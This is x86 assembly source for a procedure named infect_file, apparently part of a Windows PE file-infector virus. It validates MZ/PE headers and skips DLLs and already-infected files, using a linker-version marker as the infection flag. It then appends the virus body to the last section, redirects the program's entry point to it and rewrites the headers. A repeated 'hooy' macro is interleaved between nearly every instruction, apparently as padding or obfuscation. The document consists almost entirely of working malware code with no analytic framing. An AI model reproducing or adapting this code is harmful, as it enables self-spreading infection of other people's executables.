
 ; input:  EDX=file name
 ; output: EAX
        hooy

infect_file             proc    pascal
                        local   mz:BYTE:size mz_struc
                        local   oe:BYTE:size oe_struc
                        local   pe:BYTE:size pe_struc
                        local   oe_offs
                        pusha

        hooy
                        mov     dword ptr [esp+7*4], 0

        hooy
                        lea     esi, pe
        hooy
                        lea     edi, oe

        hooy
                        call    fopen
        hooy
                        jc      __exit
        hooy
                        xchg    ebx, eax

        hooy
                        lea     edx, mz
        hooy
                        mov     ecx, size mz_struc
        hooy
                        call    fread
        hooy
                        cmp     eax, ecx
        hooy
                        jne     __close

        hooy
                        cmp     [edx].mz_id, 'ZM'
        hooy
                        jne     __close
        hooy

        hooy
                        mov     edx, mz.mz_neptr
        hooy
                        call    fseek
        hooy

        hooy
                        mov     edx, esi
        hooy
                        mov     ecx, size pe_struc
        hooy
                        call    fread
        hooy
                        cmp     eax, ecx
        hooy
                        jne     __close
        hooy

        hooy
                        cmp     [esi].pe_id, 'EP'
        hooy
                        jne     __close

        hooy
                        test    [esi].pe_exeflags, 2000h ; dll?
        hooy
                        jne     __close
        hooy

        hooy
                        cmp     [esi].pe_linkminor, 14
        hooy
                        je      __close
        hooy
                        mov     [esi].pe_linkminor, 14

        hooy
                        or      [esi].pe_exeflags, 0001h ; relocs. stripped

        hooy
                        movzx   ecx, [esi].pe_numofobjects
        hooy
                        dec     ecx
        hooy
                        imul    ecx, size oe_struc
        hooy
                        mov     edx, mz.mz_neptr
        hooy
                        add     edx, pe_ntheader_id-pe_id ; 18h
        hooy
                        movzx   eax, [esi].pe_ntheadersize
        hooy
                        add     edx, eax
        hooy
                        add     edx, ecx
        hooy
                        mov     oe_offs, edx
        hooy
                        call    fseek

        hooy
                        mov     edx, edi
        hooy
                        mov     ecx, size oe_struc
        hooy
                        call    fread

        hooy
                        xor     eax, eax
        hooy
                        cmp     [edi].oe_virt_size, eax
        hooy
                        je      __close
        hooy
                        cmp     [edi].oe_phys_size, eax
        hooy
                        je      __close

        hooy
                        inc     dword ptr [esp+7*4]

        hooy
                        mov     eax, [edi].oe_phys_size
        hooy
                        mov     ecx, [esi].pe_filealign
        hooy
                        dec     ecx
        hooy
                        add     eax, ecx
        hooy
                        not     ecx
        hooy
                        and     eax, ecx
        hooy
                        mov     [edi].oe_phys_size, eax

        hooy
                        mov     eax, [edi].oe_virt_size
        hooy
                        mov     ecx, [esi].pe_objectalign
        hooy
                        dec     ecx
        hooy
                        add     eax, ecx
        hooy
                        not     ecx
        hooy
                        and     eax, ecx
        hooy
                        mov     [edi].oe_virt_size, eax

        hooy
                        mov     edx, [edi].oe_phys_offs
        hooy
                        add     edx, [edi].oe_phys_size
        hooy
                        call    fseek

        hooy
                        mov     eax, [edi].oe_phys_size
        hooy
                        add     eax, [edi].oe_virt_rva
        hooy
                        xchg    eax, [esi].pe_entrypointrva
        hooy
                        sub     eax, [esi].pe_entrypointrva
        hooy
                        mov     old_eip, eax
        hooy
                        mov     eax, virsize
        hooy
                        add     [edi].oe_phys_size, eax
        hooy
                        add     [edi].oe_virt_size, eax
        hooy
                        add     [esi].pe_sizeofcode, eax
        hooy
                        add     [esi].pe_imagesize, eax
        hooy

        hooy
                        add     [esi].pe_stackreservesize, 1048576
        hooy
                        add     [esi].pe_heapreservesize,  1048576
        hooy

        hooy
                        mov     ecx, virsize
        hooy
                        lea     edx, start
        hooy
                        call    fwrite

        hooy
                        mov     edx, mz.mz_neptr
        hooy
                        call    fseek

        hooy
                        mov     edx, esi
        hooy
                        mov     ecx, size pe_struc
        hooy
                        call    fwrite

        hooy
                        mov     edx, oe_offs
        hooy
                        call    fseek
        hooy

                        mov     edx, edi
        hooy
                        mov     ecx, size oe_struc
        hooy
                        call    fwrite
        hooy

__close:

        hooy
                        call    fclose
        hooy

__exit:
        hooy

                        popa
                        ret
                        endp
